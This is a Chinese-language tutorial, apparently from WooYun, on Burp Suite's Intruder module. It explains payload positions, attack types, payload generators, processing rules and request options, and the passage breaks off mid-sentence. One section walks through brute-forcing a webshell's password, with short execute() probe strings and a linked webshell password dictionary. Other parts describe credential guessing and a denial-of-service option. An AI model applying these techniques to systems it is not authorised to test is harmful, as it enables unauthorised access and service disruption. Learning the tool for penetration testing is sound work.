id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>Burp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可能出现的。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121336510.png" alt="Image085" title="image085.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711121439648.png" alt="Image087" title="image087.png"></p><p>要开始去了解BurpSuite Intruder，执行以下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1)首先，确保Burp安装并运行，并且您已配置您的浏览器与Burp工作。</span><br><span class="line">2)如果你还没有这样做的话，浏览周围的一些目标应用程序，来填充的应用程序的内容和功能的详细信息Burp的SiteMap。在这样做之前，要加快速度，进入代理服务器选项卡，然后截取子标签，并关闭代理拦截（如果按钮显示为“Intercept is On”，然后点击它来截取状态切换为关闭） 。</span><br><span class="line">3)转到Proxy选项卡，并在History选项卡。发现一个有趣的前瞻性要求，您的目标应用程序，包含了一些参数。选择这个单一的请求，然后从上下文菜单中选择“Send to intruder” 。</span><br><span class="line">4)转到Intruder标签。Burp Intruder可以让你同时配置多个攻击。您Send to Intruder的每个请求在自己的攻击选项卡中打开，而这些都是顺序编号的默认。您可以双击标签头重命名选项卡，拖动标签来重新排序，并且还关闭和打开新的标签页。</span><br><span class="line">5)为您发送请求建立的Intruder选项卡，看看Target和Positions选项卡。这些已经自动填入您发送的请求的细节。</span><br><span class="line">6)Burp Intruder本质工作，采取了基本模板的要求（你送到那里的那个） ，通过一些payloads的循环，将这些payloads送入定义的Positions，基本要求范围内，并发出每个结果的要求。位置标签用于配置，其中有效载荷将被插入到基本要求的位置。你可以看到，BurpSuite一直在你想用来放置有效载荷自动进行猜测。默认情况下，有效载荷放入所有的请求参数和cookie的值。每对有效载荷标记定义了一个有效载荷的位置，并且可以从基体的要求，这将被替换的有效载荷的内容，当该payload position用于括一些文本。有关进一步详情，请参阅Payload Markers的帮助。</span><br><span class="line">7)旁边的请求编辑器中的按钮可以被用于添加和清除有效载荷的标志。试着增加payload position在新的地点请求中，并删除其他标志物，并看到效果了。当你理解了payload positions是如何工作的，请单击“Auto§ ”按钮恢复到BurpSuite为您配置的默认payload positions。如果你修改了请求本身的文本，可以重复步骤3创建与它的原始请求一个新的Intruder的攻击选项卡。</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101711121441372.png" alt="Image089" title="image089.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8)转到Payloads选项卡。这使您可以定义将要放入已定义的有效载荷仓的有效载荷。保持默认设置（使用有效载荷的“Simple list” ） ，并添加一些测试字符串到列表中。您可以通过输入到“Enter a new item”框中，单击“add”，输入自己的字符串。或者您可以使用“add from file”下拉菜单，然后选择“Fuzzing-quick”，从内置的负载串[专业版]列表中。</span><br><span class="line">9)现在，您已经配置了最低限度的选项来发动攻击。转到Intruder菜单，然后选择“Start attack” 。</span><br><span class="line">10)在包含在结果选项卡一个新的窗口中打开攻击。结果表包含已经取得，与各关键细节，如所使用的有效载荷， HTTP状态码，响应长度等，您可以在表中选择任何项目，以查看完整的请求和响应每个请求的条目。您还可以对表进行排序通过单击列标题，并使用过滤器栏过滤表中的内容。这些特征以相同的方式工作，作为Proxy history。</span><br><span class="line">11)这次袭击窗口包含其他标签，显示被用于当前攻击的配置。您可以修改大部分这种配置的攻击已经开始。转到选项选项卡，向下滚动到“ grep-match” ，并勾选“标志的结果与项目相匹配的响应这些表达式” 。这将导致Intruder检查响应匹配列表中的每个表达式项目和标志的火柴。默认情况下，列表显示fuzzing时是很有用的一些常见的错误字符串，但可以配置，如果你想自己的字符串。返回result选项卡，看到Intruder增加了对每个项目列在列表中，而这些包含复选框，指示表达式是否被发现在每一个响应。如果你是幸运的，你的基本模糊测试可能引发一个错误的存在在一些回应的错误消息。</span><br><span class="line">12)现在，在表中选择任何项目，并期待在该项目的响应。发现在反应（如网页标题，或错误消息）一个有趣的字符串。右键单击该项目在表中，然后从上下文菜单中选择“Define extrace grep from response” 。在对话框中，选择响应的有趣字符串，然后单击“确定” 。结果表中现在包含一个新的列，其提取这一段文字从每个响应（其可以是不同的在每一种情况下） 。您可以使用此功能来定位在大型攻击有趣的数据与成千上万的反应。请注意，您还可以配置“extrace grep ”项目中的选项选项卡，在此之前前或在攻击期间。</span><br><span class="line">13)在结果表中选择任一项目，并打开上下文菜单。选择“Send to Repeater” ，然后转到Repeater选项卡。你会看到所选的请求已被复制到Repeater工具，进行进一步的测试。许多其他有用的选项是可用的上下文菜单中。有关发送BurpSuite工具之间的项目，使整体测试工作流程的详细信息。</span><br><span class="line">14)您可以使用“Save”菜单在结果窗口中都救不结果表或整个攻击。你可以加载结果表到其他工具或电子表格程序。您可以通过在主Burp的UI Intruder菜单重新加载保存的攻击。</span><br><span class="line">15)这些步骤只介绍一个简单的用例Intruder，对于Fuzzing的要求有一些标准的攻击字符串和用grep搜索中的错误消息。您可以使用Intruder许多不同类型的攻击，有许多不同的payloads和攻击选项。</span><br></pre></td></tr></table></figure><h3 id="Using-Burp-Intruder"><a href="#Using-Burp-Intruder" class="headerlink" title="Using Burp Intruder"></a>Using Burp Intruder</h3><p>for example 这里我本地搭建一个环境，爆破一个php大马，如果是一句话就把get改成post，如果是php一句话，就在下面加上php这行代码，如图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121444235.png" alt="Image091" title="image091.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asp     password=execute(&quot;response.clear:response.write(&quot;&quot;passwordright&quot;&quot;):response.end&quot;)</span><br><span class="line">php     password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)</span><br><span class="line">aspx    password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)。</span><br></pre></td></tr></table></figure><p>一般步骤如下</p><p>1.代理好服务器地址，然后访问这个大马地址</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121481236.png" alt="Image093" title="image093.png"></p><p>2.随后点击forward,并且在大马页面随便输入什么，burp拦截了数据之后发送到repeater</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121481236.png" alt="Image095" title="image095.png"></p><p>3.切换到repeater选项卡中，点击go按钮，找出一些反馈的错误信息，当然如果不要也可以，这里找错误信息是方便爆破成功了之后便于发现，我这个马反馈的是中文错误信息，显示是乱码就不写了，我们可以通过爆破成功了之后看字节数。 4.接下来就是发送到intruder，target一般都不需要管，已经自动填好了，然后选择positions</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121567189.png" alt="Image097" title="image097.png"></p><p>先点击Clear$，选择密码地地方点击add$。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121551234.png" alt="Image099" title="image099.png"></p><p>5.切换到payloads设置payload type，选择我们自己的字典</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121532703.png" alt="Image101" title="image101.png"></p><p>6.切换到options去设置进程数和失败之后重试次数、过滤结果</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121554609.png" alt="Image103" title="image103.png"></p><p>一般我都会把Grep-Match清理掉，省得干扰。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121599797.png" alt="Image105" title="image105.png"></p><p>7.接下来点击intruder下的start attack就开始爆破了，密码admin，我是根据length来判断跟其他的不同</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121647776.png" alt="Image107" title="image107.png"></p><p>附赠一个webshell字典：<a href="https://wooyun.js.org/images_result/images/2014101711121696735.zip">shellpassword.txt.zip</a></p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><p>用于配置目标服务器进行攻击的详细信息。所需的选项有： Host(主机) - 这是目标服务器的IP地址或主机名。 Port(端口) - 这是HTTP &#x2F; S服务的端口号。 Use HTTPS(使用HTTPS)，这指定的SSL是否应该被使用。 配置这些细节最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder一个新的选项卡，将自动填充的目标和位置选项卡。</p><h3 id="Positions"><a href="#Positions" class="headerlink" title="Positions"></a>Positions</h3><p>用于配置request temlate的攻击，和payloads markers、attack type一起。</p><h3 id="Request-Template"><a href="#Request-Template" class="headerlink" title="Request Template"></a>Request Template</h3><p>主要请求编辑器是用来定义从所有攻击请求都将被导出的请求模板。对于每一个攻击的请求，BurpSuite接受请求的模板，并把一个或多个有效载荷送入由有效载荷标记定义的位置。 成立请求模板的最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder的选项卡，将自动填充的Target和Positions选项卡。</p><h3 id="Payload-Markers"><a href="#Payload-Markers" class="headerlink" title="Payload Markers"></a>Payload Markers</h3><p>有效载荷的标记是使用§字符，并且功能如下放置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)每对标记指定一个有效载荷的位置。</span><br><span class="line">2)一对标记物可以从它们之间任选的模板要求附上一些文字。</span><br><span class="line">3)当一个有效载荷的位置被分配了一个有效载荷，无论是标记和任何包含的文本将被替换为有效载荷。</span><br><span class="line">4)当一个有效载荷的位置不具有分配的有效载荷，该标记将被删除，但是所包含的文本保持不变。</span><br></pre></td></tr></table></figure><p>为了使配置更加简单，Intruder会自动突出显示每对有效载荷的标记和任何它们之间包含的文本。</p><p>您可以手动或自动做有效载荷标记。当您从BurpSuite别处发送一个请求到Intruder，Intruder猜测你可能要放置有效载荷，并设置相应的有效载荷标记。您可以修改使用按钮的默认有效载荷标记旁边的请求模板编辑器：</p><p>Add§ - 如果没有文本被选中，该插入一个有效载荷标记在光标位置。如果您已经选择了一些文字，一对标记插入封闭选定的文本。 Clear§ - 这将删除所有的位置标记，无论是从整个模板或模板的选定部分。 Auto§ - 自动放置有效载荷标记。包括价值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1)URL查询字符串参数</span><br><span class="line">2)车身参数</span><br><span class="line">3)曲奇饼</span><br><span class="line">4)多重参数属性（例如，在文件上传的文件名）</span><br><span class="line">5)XML数据和元素属性</span><br><span class="line">6)JSON参数</span><br></pre></td></tr></table></figure><p>您可以配置自动负载位置是否将更换或追加到现有的参数值，通过入侵者菜单上的选项。需要注意的是，如果一个子部分的要求，但不是整个消息体，包含格式化数据使用XML或JSON ，可以自动通过这种结构中的位置的有效载荷手动选择格式化数据的准确块，并使用“自动”按钮在其定位的有效载荷。这是有用的，例如，当一个多参数的值包含在XML或JSON格式数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">刷新 - 这将刷新请求模板编辑器的语法彩色化，如果必要的。</span><br><span class="line">清除 - 这会删除整个请求模板。</span><br></pre></td></tr></table></figure><p>注意：您也可以使用入侵者的有效载荷仓的UI通过BurpSuite扫描仪配置自定义插入点主动扫描。要做到这一点，配置请求模板和有效载荷在标记内入侵者通常的方式，然后选择从入侵者菜单中的“主动扫描定义插入点” 。</p><h3 id="Attack-type"><a href="#Attack-type" class="headerlink" title="Attack type"></a>Attack type</h3><p>Burp Intruder支持各种攻击类型 - 这些决定在何种负载分配给有效载荷仓的方式。攻击类型可以使用请求模板编辑器上方的下拉菜单进行选择。以下攻击类型可供选择：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121998569.png" alt="Image109" title="image109.png"></p><p>Sniper(狙击手) - 这将使用一套单一的payloads。它的目标依次在每个有效载荷的位置，并把每个有效载荷送入依次那个位置。这不是针对一个给定的请求的位置不受影响 - 位置标记被移除，并在它们之间出现在模板中任何封闭文本保持不变。这种攻击类型为个别模糊测试的一些请求参数常见的漏洞非常有用。在攻击中生成的请求的总数是位置的数目和在有效载荷中设定的有效载荷的数量的乘积。</p><p>Battering ram(撞击物) - 使用一组payload。通过迭代的有效载荷方式，并将相同的payloads再一次填充到所有已定义的有效载荷仓。当其中一个攻击需要相同的输入将被插入在多个地方在请求中（例如，一个Cookie中的用户名和cookie参数）对这种攻击类型是非常有用的。在攻击中生成的请求的总数是有效载荷的有效载荷中设定的数目。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121992842.png" alt="Image111" title="image111.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711121957831.png" alt="Image113" title="image113.png"></p><p>例如生成一组数字1-9，则就是1-1 ，2-2，3-3这种形式 Pitchfork(相交叉) - 这将使用多个payloads集。有对每个定义的位置（最多20个）不同的有效载荷组。通过设置所有有效载荷的攻击迭代的方式，并将一个有效载荷到每个定义的位置。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122127325.png" alt="Image115" title="image115.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711122150222.png" alt="Image117" title="image117.png"></p><p>例如设置多个，每个payload设置一个字典，则就是1-1-1，2-2-2，3-3-3这种形式</p><p>换句话说，第一个请求将放置第一个有效载荷的Payload set 1到Positions 1 ，并从有效载荷中的第一个Payload set 2到Positons 2 ;第二个请求将放置第二个Payload set 1到Positions 1 ，并从payload中的第二个Payload set 2到Postions2 ，等在那里的攻击需要不同但相关的输入进行插在多个地方，这种攻击类型是有用的请求（例如，用户名中的一个参数，和对应于该用户名中的另一个参数已知的ID号） 。在攻击中生成的请求的总数是有效载荷中的最小有效载荷组的数目。</p><p>Cluster bomb(集束炸弹) - 使用多个Payload sets。有对每个定义的Positions（最多20个）设置不同的payload set。通过每个有效载荷的攻击迭代依次设置，使有效载荷组合的所有排列进行测试。</p><p>例如设置三个字典都是10个数，则总共有1000总匹配的模式</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122189353.png" alt="Image119" title="image119.png"></p><p>也就是说，如果有两个有效载荷的位置，则该攻击将放置第一个有效载荷从payload set 2到Positions 2 ，并通过在有效负载的所有 payload set 1中的positions 1 ;然后它将第二个有效载荷从载荷设置2到位置2 ，并通过有效载荷全部载入循环设置1到位置1 。其中一个攻击需要不同的和无关的或未知输入要在多个地方插入这种类型的攻击是非常有用的在请求中（例如猜测凭证，在一个参数的用户名，并且在另一个参数密码时） 。在攻击中生成的请求的总数是在所有定义的有效载荷的有效载荷集的数目的乘积 - 这可能是非常大的。</p><h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><p>Burp Intruder包含以下几种attack type:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Simple list--简单字典</span><br><span class="line">Runtime file--运行文件</span><br><span class="line">Custom iterator--自定义迭代器</span><br><span class="line">Character substitution--字符替换</span><br></pre></td></tr></table></figure><p>此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。 用户界面允许您配置了一些字符替换。当执行攻击，有效载荷类型工程通过逐一配置的列表项。对于每个项目，它产生一个数的有效载荷，根据所定义的取代基包括取代的字符的所有排列。例如，默认替换规则（其中包括e&gt;3且t&gt;7），该项目“peter”将产生以下的有效载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">p3ter</span><br><span class="line">pe7er</span><br><span class="line">p37er</span><br><span class="line">pet3r</span><br><span class="line">p3t3r</span><br><span class="line">pe73r</span><br><span class="line">p373r</span><br></pre></td></tr></table></figure><p>Case modification–此负载类型允许您配置一个字符串列表，并应用各种情况下修改每个项目。这可能是密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。 可以选择以下的情况下修改规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">No change - 这个项目可以用不被修改。 </span><br><span class="line">To lower case- 在该项目的所有字母转换为小写。 </span><br><span class="line">To upper case - 在该项目的所有字母转换为大写。 </span><br><span class="line">To Propername - 在该项目的第一个字母转换为大写，以及随后的字母转换为小写。 </span><br><span class="line">To ProperName - 在该项目的第一个字母转换为大写，以及随后的字母都不会改变。</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Peter Wiener</span><br><span class="line">peter wiener</span><br><span class="line">PETER WIENER</span><br><span class="line">Peter wiener</span><br></pre></td></tr></table></figure><p>选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Recursive grep--递归grep</span><br><span class="line">Illegal Unicode--非法的Unicode</span><br><span class="line">Character blocks--字符块</span><br><span class="line">Numbers--数字</span><br><span class="line">Dates--日期</span><br><span class="line">Brute forcer--暴力</span><br><span class="line">Null payloads--空的有效负载</span><br><span class="line">Character frobber--性格frobber</span><br><span class="line">Bit flipper--位翻转</span><br><span class="line">Username generator--用户名生成器</span><br><span class="line">ECB block shuffler--欧洲央行座洗牌</span><br><span class="line">Extension-generated--扩展生成</span><br><span class="line">Copy other payload--复制其它有效负载</span><br></pre></td></tr></table></figure><h3 id="Processing"><a href="#Processing" class="headerlink" title="Processing"></a>Processing</h3><p>由配置的有效载荷类型生成的有效载荷可以使用各种有效载荷的处理规则和有效负载编码可以进一步操纵。</p><h4 id="1-Payload-Processing-Rules"><a href="#1-Payload-Processing-Rules" class="headerlink" title="1)Payload Processing Rules"></a>1)Payload Processing Rules</h4><p>在它被使用之前可以定义规则来对每个有效载荷执行各种处理任务。该定义的规则按顺序执行，并且可以打开和关闭，以帮助调试与配置的任何问题。有效载荷的处理规则是有用的在多种情况下，你需要生成不同寻常的有效载荷，或者需要在一个更广泛的结构或在使用前编码方案包的有效载荷可达。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122171902.png" alt="Image121" title="image121.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Add prefix - 添加一个文字前缀</span><br><span class="line">Add suffix - 添加一个文字后缀</span><br><span class="line">Match/replace - 将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。</span><br><span class="line">Substring - 提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。</span><br><span class="line">Reverse substring - 对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。</span><br><span class="line">Modify case - 这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型。</span><br><span class="line">Encode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台：采用不同的计划，该编码的有效载荷。</span><br><span class="line">Hash - hash</span><br><span class="line">Add raw payload - 这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。</span><br><span class="line">Skip raw payload - 将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。</span><br><span class="line">Invoke Burp extension - 调用一个Burp exxtension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以从已注册的当前加载的扩展可用的处理器列表中选择所需的处理器。</span><br></pre></td></tr></table></figure><p>是规则的以下类型：</p><h4 id="2-Payload-Encoding"><a href="#2-Payload-Encoding" class="headerlink" title="2)Payload Encoding"></a>2)Payload Encoding</h4><p>你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。…</p><h3 id="Optins"><a href="#Optins" class="headerlink" title="Optins"></a>Optins</h3><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><h4 id="Request-Headers-1"><a href="#Request-Headers-1" class="headerlink" title="Request Headers"></a>Request Headers</h4><p>这些设置控制在攻击Intruder(入侵者)是否更新配置请求头。请注意，您可以完全控制请求头通过在Payload positions(有效载荷位置)标签的要求范围内。这些选项可以用来更新每个请求的报头的方式，通常是有帮助的。</p><p>下列选项可用：</p><p>Update Content-length header(更新Content-Length头) - 此选项使Intruder(入侵者)添加或更新的Content-Length头的每个请求，与该特定请求的HTTP体的长度正确的值。此功能通常用于该插入可变长度的有效载荷送入模板的HTTP请求的主体的攻击至关重要。如果未指定正确的值，则目标服务器可能会返回一个错误，可能不完全响应请求，或者可能无限期地等待在请求继续接收数据。</p><p>Set Connection:close(设置连接：关闭) - 此选项使Intruder(入侵者)添加或更新连接头的值为“close(关闭)” 。在某些情况下（当服务器本身并不返回一个有效的Content-Length或Transfer-Encoding头） ，这个选项可以让攻击更快速地执行。</p><h4 id="Request-Engine"><a href="#Request-Engine" class="headerlink" title="Request Engine"></a>Request Engine</h4><p>设置控制用于发出HTTP请求中的Intruder(入侵者)攻击的Engine(引擎)。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Number of threads(执行进程数) - [专业版]该选项控制并发请求数的攻击。</span><br><span class="line">Number of retries on network failure(网络故障的重试次数) - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class="line">Pause before retry(重试前暂停) - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位） ，然后重试失败以下。如果服务器被宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class="line">Throttle between requests(请求之间的节流) - Burp可以在每次请求之前等待一个指定的延迟（以毫秒为单位） 。此选项很有用，以避免超载应用程序，或者是更隐蔽。或者，您可以配置一个可变延迟（与给定的初始值和增量） 。这个选项可以是有用的测试应用程序执行的会话超时时间间隔。</span><br><span class="line">Start time(开始时间) - 此选项允许您配置攻击立即启动，或在指定的延迟后，或开始处于暂停状态。如果攻击被配置，将在未来的某个时刻以供将来使用被执行，或保存这些替代品可能是有用的。</span><br></pre></td></tr></table></figure><p>小心使用这些选项可让您微调攻击引擎，这取决于对应用程序性能的影响，并在自己的处理能力和带宽。如果您发现该攻击运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，使你的攻击进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。</p><h4 id="Attack-Results"><a href="#Attack-Results" class="headerlink" title="Attack Results"></a>Attack Results</h4><p>这些设置控制哪些信息被捕获的攻击效果。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Store requests/responses(存储请求/响应) - 这些选项确定攻击是否会保存单个请求和响应的内容。保存请求和响应占用磁盘空间，在你的临时目录中，但可以让您在攻击期间在众目睽睽这些，如果有必要重复单个请求，并将其发送到其他Burp工具。</span><br><span class="line">Make unmodified baseline request(未修改的基本请求) - 如果选择此选项，那么除了配置的攻击请求，Burp会发出模板请求设置为基值，所有有效载荷的位置。此请求将在结果表显示为项目＃ 0 。使用此选项很有用，提供一个用来比较的攻击响应基地的响应。</span><br><span class="line">Use denial-of-service mode(使用拒绝服务的模式) - 如果选择此选项，那么攻击会发出请求，如正常，但不会等待处理从服务器收到任何答复。只要发出的每个请求， TCP连接将被关闭。这个功能可以被用来执行拒绝服务的应用层对脆弱的应用程序的攻击，通过重复发送该启动高负荷任务的服务器上，同时避免通过举办开放套接字等待服务器响应锁定了本地资源的请求。</span><br><span class="line">Store full payloads(保存完整的有效载荷) - 如果选择此选项，Burp将存储全部有效载荷值的结果。此选项会占用额外的内存，但如果你想在运行时执行某些操作，如修改payload grep setting(有效负载值设置)，或重新发出请求与修改请求模板可能需要。</span><br></pre></td></tr></table></figure><h4 id="Grep-Match"><a href="#Grep-Match" class="headerlink" title="Grep-Match"></a>Grep-Match</h4><p>设置可用于包含在响应中指定的表达式标志结果的项目。对于配置列表中的每个项目，Burp会添加一个包含一个复选框，指出项目是否被发现在每个响应的新成果列。然后，您可以到组排序此列（通过单击列标题）匹配的结果相加。</p><p>使用此选项可以是非常强大的，帮助分析大套的成绩，并迅速找出有趣的项目。例如，在口令猜测攻击，扫描短语，如“password incorrect(密码不正确)”或“login successful(登录成功)”，可以找到成功登录;在测试SQL注入漏洞，扫描含有“ ODBC ” ， “error(错误)”等消息可以识别易受攻击的参数。</p><p>除了表达式匹配的列表，下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Match(匹配类型) - 指定的表达式是否是简单的字符串或regular expressions(正则表达式)。</span><br><span class="line">Case sensitive match(区分大小写的匹配) - 指定检查表达式是否应区分大小写。</span><br><span class="line">Exclude HTTP headers(不包括HTTP头) - 指定的HTTP响应头是否应被排除在检查。</span><br></pre></td></tr></table></figure><h4 id="Grep-Extrack"><a href="#Grep-Extrack" class="headerlink" title="Grep-Extrack"></a>Grep-Extrack</h4><p>可以被用来Extrack(提取)从反应有用的信息进入攻击结果的表。对于配置列表中的每个项目，Burp会添加一个包含提取该项目的文本的新成果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。例如我要匹配</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122144357.png" alt="Image123" title="image123.png"></p><p>information_schema这个表。则可以这样写，都是需要匹配唯一的那种，也可以使用正则，前提是你会写正则。在乌云社区有人提起过当时怎么匹配手机号，就可以从这里提取。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122149847.png" alt="Image125" title="image125.png"></p><h4 id="Grep-Payloads"><a href="#Grep-Payloads" class="headerlink" title="Grep-Payloads"></a>Grep-Payloads</h4><p>设置可用于含有所提交的有效载荷的反射标志的结果项。如果启用该选项，Burp会添加一个包含一个复选框，指示当前负载的值是否被发现在每个响应的新成果列。 （如果使用一个以上的有效载荷，单独的列将每个有效载荷集加。 ）</p><p>此功能可以在检测跨站点脚本和其他应对注入漏洞，它可以出现在用户输入动态地插入到应用程序的响应是有用的。</p><p>下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Case sensitive match(区分大小写的匹配) - 指定检查payload(负载)是否应区分大小写。</span><br><span class="line">Exclude HTTP headers(不包括HTTP头) - 这指定的HTTP响应头是否应被排除在检查。</span><br><span class="line">Match against pre-URL-encoded payloads(对预URL编码的有效载荷匹配) - 这是正常的配置Inturder(入侵者)请求中URL编码的有效载荷。然而，这些通常是由应用程序解码，回荡在他们的原始形式。您可以使用此选项，以用于有效载荷Burp检查反应在他们的预编码形式。</span><br></pre></td></tr></table></figure><h4 id="Redirections"><a href="#Redirections" class="headerlink" title="Redirections"></a>Redirections</h4><p>控制Burp在进行攻击时如何处理重定向。它往往是要遵循重定向来实现你的攻击目标。例如，在一个口令猜测攻击，每一次尝试的结果可能只能通过下面的重定向显示。模糊测试的时候，相关的反馈可能只出现在最初的重定向响应后返回的错误消息。</p><p>下列选项可用： Follow redirections(跟随重定向) - 控制重定向都遵循的目标。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)Never(从来没有) - 入侵者不会遵循任何重定向。</span><br><span class="line">2)On-site only(现场唯一的) - 入侵者只会跟随重定向到同一个网页“网站” ，即使用相同的主机，端口和协议的是在原始请求使用的URL 。</span><br><span class="line">3)In-scope 